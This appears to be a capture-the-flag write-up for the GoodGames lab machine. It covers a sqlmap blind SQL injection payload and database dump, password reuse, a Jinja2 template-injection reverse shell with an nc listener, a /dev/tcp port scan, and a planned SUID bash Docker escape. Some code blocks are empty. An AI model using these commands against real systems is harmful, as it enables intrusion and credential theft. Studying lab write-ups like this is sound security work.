This website looks like it is some video game site. Looking around the home page at the bottom I found `GoodGames.HTB`. I'll add the entry `10.10.11.130 goodgames.htb` to `/etc/passwd` for name resolution.

I was tested a bunch of inputs for sqli and I found one that was vulnerable to a time-based blink attack. If you click on the little profile box on the top right of the main screen we get brought to a sign-in page

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/a7edb2f068be40b8b0a933bdec9d85bd.png)


I gave it some parameters and captured the request in burp.

I saved the request as `request.txt` and used sqlmap to test the two parameters "email" and "password".

```

```

The command I ran was `sqlmap -r request.txt --batch`. The `-r` specifies a request file (the request I intercepted above) and `--batch` just makes it go without asking for user input. I let it run and it came back as vulnerable

```
Parameter: email (POST)                                                                                                                                                                      
    Type: time-based blind                                                                                                                                                                   
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                 
    Payload: email=test@test.com' AND (SELECT 9842 FROM (SELECT(SLEEP(5)))qyrv) AND 'IOxB'='IOxB&password=test
```

Now I can run `sqlmap -r request.txt --dbs` to view the databases and we can see two information_schema and main. Lets get the tables from "main" by running `sqlmap -r request.txt -D main --tables`. We then can see three tables blog, blog_comments, and user. Finially we can get the data from the user table with `sqlmap -r request.txt -D main -T user --dump`

```

I used crackstion.net to see if the hash has been cracked and it has been

I can now log in with the creds. From the sqlmap I got a username of "admin" I was able to guess the email address because I found the hostname earlier

Once signed it I now have a little gear at the top right corner

But if I click it I get the error below. To fix this I'll add `internal-administration.goodgames.htb` to my `/etc/hosts` file

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/e6141cb3d13044878dc2ea8480106317.png)


Then I'm sent to another login page and the same credentials `admin:superadministrator` gets me into this page

Under `/settings` , I found that it was vulnerable to Server Side Template Injection. I tested this by putting {{1+1}} into the "Full Name section". Notice that the name changed to "2"

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/006a86b7dcd5472bbe3f2a71695e9d42.png)


I found this article that gives an example of a reverse shell using ssti. https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6

I intercepted the request to `/settings` and put the ssti payload into "name" and sent it to repeater in case we lose our shell.

I'll start a listener `nc -lvnp 4444` and send the request

# Escaping Docker

I like having better shells so I'll use a python one-liner to upgrade my shell `python -c 'import pty; pty.spawn("/bin/bash")'`. I can see that I'm in a docer container because of the hostname and there is a Dockerfile in the directory

```
root@3a453ab39d3d:/backend# ls
ls
Dockerfile  project  requirements.txt
```

If we go into `/home/augustus` we can read the user.txt file. We can also see that the UID of the files are `1000` . This hints that the user augustus has mounted his home directory into this docker container.

Doing a little bit of networking enumeration by running `ip a` we can see that our ip is `172.19.0.2`. I bet that the host (being the machine running docker) is `172.19.0.1`.

```
root@3a453ab39d3d:/home/augustus# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000

       valid_lft forever preferred_lft forever
root@3a453ab39d3d:/home/augustus# 
```

I tried to ping the host machine and it is indeed up `64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.057 ms`. I dont have nmap on this machine but I can use a bash one-liner to try and do a quick port scan on the host

```bash
for PORT in {0..100}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
<ull" 2>/dev/null && echo "port $PORT is open"; done
```

I then get an output of

```

<ull" 2>/dev/null && echo "port $PORT is open"; done
port 22 is open
port 80 is open
```

There is a good chance we can reuse our credentials so ssh into the host machine as `augustus:superadministrator` and it goes through!

```

If we remember from before the path `/home/augustus` was mounted to the docker container. We might be able to copy `/bin/bash` to `/home/augustus` and use our root privilege's on the docker container to change the owner and SUID permissions to allow augustus to run it as root
